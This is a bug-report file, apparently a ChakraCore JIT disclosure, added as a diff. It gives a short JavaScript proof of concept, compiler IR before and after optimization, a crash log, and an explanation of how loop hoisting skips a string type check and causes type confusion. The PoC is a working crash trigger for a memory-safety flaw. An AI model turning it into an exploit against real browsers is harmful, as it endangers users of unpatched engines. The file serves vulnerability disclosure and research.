@@ -1,0 +1,199 @@
+/*
+Here's a PoC:
+*/
+
+function opt(str) {
+    for (let i = 0; i < 200; i++) {
+        let tmp = str.charCodeAt('AAAAAAAAAA' + str + 'BBBBBBBBBB');
+    }
+}
+
+opt('x');
+opt(0x1234);
+
+/*
+Here's the IR code of the PoC before the global optimization phase:
+---------
+                       FunctionEntry                                          #
+    s18.u64         =  ArgIn_A        prm1<32>.var                            #
+    s9.var          =  LdSlot         s32(s18l[53]).var                       #
+    s7.var          =  LdSlot         s20(s18l[51]).var                       #
+    s8.var          =  LdSlot         s19(s18l[52]).var                       #
+    s1[Object].var  =  Ld_A           0x7FFFF47A0000 (GlobalObject)[Object].var #
+    s2.var          =  LdC_A_I4       0 (0x0).i32                             #
+    s3.var          =  LdC_A_I4       200 (0xC8).i32                          #
+    s4.var          =  LdC_A_I4       1 (0x1).i32                             #
+    s5[String].var  =  LdStr          0x7FFFF47B9080 ("AAAAAAAAAA")[String].var #
+    s6[String].var  =  LdStr          0x7FFFF47B90A0 ("BBBBBBBBBB")[String].var #
+    s17.var         =  InitLoopBodyCount                                      #0009 
+---------
+$L1: >>>>>>>>>>>>>  LOOP TOP  >>>>>>>>>>>>>       Implicit call: no           #000b 
+
+
+  Line   2: i < 200; i++) {
+  Col   21: ^
+                       StatementBoundary  #1                                  #000b 
+    s17.i32         =  IncrLoopBodyCount  s17.i32                             #000b 
+                       BrLt_A         $L3, s8.var, s3.var                     #000b 
+                       Br             $L2                                     #0010 
+---------
+$L3:                                                                          #0013 
+
+
+  Line   3: let tmp = str.charCodeAt('AAAAAAAAAA' + str + 'BBBBBBBBBB');
+  Col    9: ^
+                       StatementBoundary  #2                                  #0013 
+    s13.var         =  Ld_A           s7.var                                  #0013 
+                       CheckFixedFld  s21(s13->charCodeAt)<0,m~=,+-,s?,s?>.var #0016  Bailout: #0016 (BailOutFailedEquivalentFixedFieldTypeCheck)
+    s12[ffunc][Object].var = Ld_A     0x7FFFF47972C0 (FunctionObject).var     #
+    s22.var         =  StartCall      2 (0x2).i32                             #001a 
+    s36.var         =  BytecodeArgOutCapture  s13.var                         #001d 
+    s24[String].var =  Conv_PrimStr   s5.var                                  #0020 
+    s25[String].var =  Conv_PrimStr   s7.var                                  #0020 
+    s26[String].var =  Conv_PrimStr   s6.var                                  #0020 
+                       ByteCodeUses   s7                                      #0020 
+    s27.var         =  SetConcatStrMultiItemBE  s24[String].var               #0020 
+    s28.var         =  SetConcatStrMultiItemBE  s25[String].var, s27.var      #0020 
+    s29.var         =  SetConcatStrMultiItemBE  s26[String].var, s28.var      #0020 
+    s14[String].var =  NewConcatStrMultiBE  3 (0x3).u32, s29.var              #0020 
+    s35.var         =  BytecodeArgOutCapture  s14.var                         #0025 
+    arg1(s34)<0>.u64 = ArgOut_A_InlineSpecialized  0x7FFFF47972C0 (FunctionObject).var, arg2(s30)<8>.var #0028 
+    arg1(s23)<0>.var = ArgOut_A       s36.var, s22.var                        #0028 
+    arg2(s30)<8>.var = ArgOut_A       s35.var, arg1(s23)<0>.var               #0028 
+                       ByteCodeUses   s12                                     #0028 
+    s31[CanBeTaggedValue_Int_Number].var = CallDirect  String_CharCodeAt.u64, arg1(s34)<0>.u64 #0028 
+    s9.var          =  Ld_A           s31.var                                 #0032 
+
+
+  Line   2: i++) {
+  Col   30: ^
+                       StatementBoundary  #3                                  #0035 
+    s8.var          =  Incr_A         s8.var                                  #0035 
+                       Br             $L1                                     #0038 
+---------
+$L2:                                                                          #003d 
+
+
+  Line   5: }
+  Col    1: ^
+                       StatementBoundary  #4                                  #0038 
+    s16.i64         =  Ld_I4          61 (0x3D).i64                           #003d 
+    s19(s18l[52]).var = StSlot        s8.var                                  #003e 
+    s32(s18l[53]).var = StSlot        s9.var                                  #003e 
+                       StLoopBodyCount  s17.i32                               #003e 
+                       Ret            s16.i64                                 #003e 
+----------------------------------------------------------------------------------------
+
+After the global optimization phase:
+---------
+    FunctionEntry                                          #
+    s18.u64         =  ArgIn_A        prm1<32>.var!                           #
+    s9[LikelyCanBeTaggedValue_Int].var = LdSlot  s32(s18l[53])[LikelyCanBeTaggedValue_Int].var! #
+    s7<s44>[LikelyCanBeTaggedValue_String].var = LdSlot  s20(s18l[51])[LikelyCanBeTaggedValue_String].var! #
+    s8[LikelyCanBeTaggedValue_Int].var = LdSlot  s19(s18l[52])[LikelyCanBeTaggedValue_Int].var! #
+    s5[String].var  =  LdStr          0x7FFFF47B9080 ("AAAAAAAAAA")[String].var #
+    s6[String].var  =  LdStr          0x7FFFF47B90A0 ("BBBBBBBBBB")[String].var #
+    s17.var         =  InitLoopBodyCount                                      #0009 
+    s42(s8).i32     =  FromVar        s8[LikelyCanBeTaggedValue_Int].var      #      Bailout: #000b (BailOutIntOnly)
+    s27.var         =  SetConcatStrMultiItemBE  s5[String].var                #0020 
+    s49[String].var =  Conv_PrimStr   s7<s44>[String].var                     #
+    s28.var         =  SetConcatStrMultiItemBE  s49[String].var!, s27.var!    #0020 
+    s29.var         =  SetConcatStrMultiItemBE  s6[String].var, s28.var!      #0020 
+    s14[String].var =  NewConcatStrMultiBE  3 (0x3).u32, s29.var!             #0020 
+                       BailTarget                                             #      Bailout: #000b (BailOutShared)
+---------
+$L1: >>>>>>>>>>>>>  LOOP TOP  >>>>>>>>>>>>>       Implicit call: no           #000b 
+
+
+  Line   2: i < 200; i++) {
+  Col   21: ^
+                       StatementBoundary  #1                                  #000b 
+    s17.i32         =  IncrLoopBodyCount  s17.i32!                            #000b 
+                       BrGe_I4        $L2, s42(s8).i32, 200 (0xC8).i32        #000b 
+
+
+  Line   3: let tmp = str.charCodeAt('AAAAAAAAAA' + str + 'BBBBBBBBBB');
+  Col    9: ^
+                       StatementBoundary  #2                                  #0013 
+                       CheckFixedFld  s43(s7<s44>[LikelyCanBeTaggedValue_String]->charCodeAt)<0,m~=,++,s44!,s45+,{charCodeAt(0)~=}>.var! #0016  Bailout: #0016 (BailOutFailedEquivalentFixedFieldTypeCheck)
+    s22.var         =  StartCall      2 (0x2).i32                             #001a 
+    arg1(s34)<0>.u64 = ArgOut_A_InlineSpecialized  0x7FFFF47972C0 (FunctionObject).var, arg2(s30)<8>.var! #0028 
+    arg1(s23)<0>.var = ArgOut_A       s7<s44>[String].var, s22.var!           #0028 
+    arg2(s30)<8>.var = ArgOut_A       s14[String].var, arg1(s23)<0>.var!      #0028 
+    s31[CanBeTaggedValue_Int_Number].var = CallDirect  String_CharCodeAt.u64, arg1(s34)<0>.u64! #0028  Bailout: #0032 (BailOutOnImplicitCalls)
+    s9[CanBeTaggedValue_Int_Number].var = Ld_A  s31[CanBeTaggedValue_Int_Number].var! #0032 
+
+
+  Line   2: i++) {
+  Col   30: ^
+                       StatementBoundary  #3                                  #0035 
+    s42(s8).i32     =  Add_I4         s42(s8).i32!, 1 (0x1).i32               #0035 
+                       Br             $L1                                     #0038 
+---------
+$L2:                                                                          #003d 
+
+
+  Line   5: }
+  Col    1: ^
+                       StatementBoundary  #4                                  #003d 
+    s8[CanBeTaggedValue_Int].var = ToVar  s42(s8).i32!                        #003e 
+    s19(s18l[52])[CanBeTaggedValue_Int].var! = StSlot  s8[CanBeTaggedValue_Int].var! #003e 
+    s32(s18l[53])[LikelyCanBeTaggedValue_Int_Number].var! = StSlot  s9[LikelyCanBeTaggedValue_Int_Number].var! #003e 
+                       StLoopBodyCount  s17.i32!                              #003e 
+                       Ret            61 (0x3D).i32                           #003e 
+----------------------------------------------------------------------------------------
+
+Crash log:
+[----------------------------------registers-----------------------------------]
+RAX: 0x1000000001234 
+RBX: 0x7ffff47c5ff4 --> 0x31 ('1')
+RCX: 0x7ff7f4600000 --> 0x0 
+RDX: 0x0 
+RSI: 0x80000001 --> 0x0 
+RDI: 0x1000000001234 
+RBP: 0x7ffffffef410 --> 0x7ffffffef590 --> 0x7ffffffefb90 --> 0x7ffffffefc90 --> 0x7ffffffefef0 --> 0x7fffffff48b0 (--> ...)
+RSP: 0x7ffffffef340 --> 0x7ffffffef3b0 --> 0x1000000001234 
+RIP: 0x7ff7f385017a (cmp    QWORD PTR [rax],r10)
+R8 : 0x55555cfbc870 --> 0x555557fc27e0 (<Js::RecyclableObject::Finalize(bool)>: push   rbp)
+R9 : 0x7ff7f4600000 --> 0x0 
+R10: 0x55555cfbc870 --> 0x555557fc27e0 (<Js::RecyclableObject::Finalize(bool)>: push   rbp)
+R11: 0x7ffff47b9080 --> 0x55555cfa0f18 --> 0x555557fc27e0 (<Js::RecyclableObject::Finalize(bool)>:  push   rbp)
+R12: 0x0 
+R13: 0x7ffff47b36b0 --> 0x55555cfbee70 --> 0x555557fc27e0 (<Js::RecyclableObject::Finalize(bool)>:  push   rbp)
+R14: 0x0 
+R15: 0x1000000001234
+EFLAGS: 0x10202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x7ff7f385016e:  mov    BYTE PTR [rcx+rax*1],0x1
+   0x7ff7f3850172:  mov    rax,QWORD PTR [rbp-0x10]
+   0x7ff7f3850176:  mov    r10,QWORD PTR [rbp-0x18]
+=> 0x7ff7f385017a:  cmp    QWORD PTR [rax],r10
+   0x7ff7f385017d:  je     0x7ff7f385037c
+   0x7ff7f3850183:  mov    rcx,rax
+   0x7ff7f3850186:  mov    QWORD PTR [rbp-0x18],rcx
+   0x7ff7f385018a:  mov    eax,DWORD PTR [rcx+0x18]
+[------------------------------------stack-------------------------------------]
+0000| 0x7ffffffef340 --> 0x7ffffffef3b0 --> 0x1000000001234 
+0008| 0x7ffffffef348 --> 0x7ffff471c1e0 --> 0x55555cf48850 --> 0x555556c17100 (<Js::FunctionBody::Finalize(bool)>:  push   rbp)
+0016| 0x7ffffffef350 --> 0x7ffff471c298 --> 0x7ffff4774140 --> 0x10f1215030708 
+0024| 0x7ffffffef358 --> 0x7ffff471c298 --> 0x7ffff4774140 --> 0x10f1215030708 
+0032| 0x7ffffffef360 --> 0x7ffffffef410 --> 0x7ffffffef590 --> 0x7ffffffefb90 --> 0x7ffffffefc90 --> 0x7ffffffefef0 (--> ...)
+0040| 0x7ffffffef368 --> 0x555556c40b8b (<Js::CompactCounters<Js::FunctionBody, Js::FunctionBody::CounterFields>::Get(Js::FunctionBody::CounterFields) const+139>:  movzx  ecx,BYTE PTR [rbp-0x22])
+0048| 0x7ffffffef370 --> 0x7ffff47a4238 --> 0x7ffff47c5fe0 --> 0x7ffff4796a40 --> 0x55555cf4df58 --> 0x555556cb7a20 (<JsUtil::List<Js::LoopEntryPointInfo*, Memory::Recycler, false, Js::CopyRemovePolicy, DefaultComparer>::IsReadOnly() const>:   push   rbp)
+0056| 0x7ffffffef378 --> 0x7ffffffef4a0 --> 0x7ffffffef4c0 --> 0x7ffffffef590 --> 0x7ffffffefb90 --> 0x7ffffffefc90 (--> ...)
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x00007ff7f385017a in ?? ()
+
+
+Background:
+Invariant operations like SetConcatStrMultiItemBE in a loop can be hoisted to the landing pad of the loop to avoid performing the same operation multiple times. When Chakra hoists a SetConcatStrMultiItemBE instruction, it creates a new Conv_PrimStr instruction to ensure the type of the Src1 of the SetConcatStrMultiItemBE instruction to be String and inserts it right before the SetConcatStrMultiItemBE instruction.
+
+What happens here is:
+1. The CheckFixedFld instruction ensures the type of s7 to be String.
+2. Chakra judges that the CheckFixedFld instruction can't be hoisted in the case. It remains in the loop.
+3. Chakra judges that the SetConcatStrMultiItemBE instructions can be hoisted. It hoists them along with a newly created Conv_PrimStr instruction, but without invalidating the type of s7 (String).
+4. So the "s49[String].var =  Conv_PrimStr   s7<s44>[String].var" instruction is inserted into the landing pad. Since s7 is already assumed to be of String, the instruction will have no effects at all.
+5. No type check will be performed. It will result in type confusion.
+*/
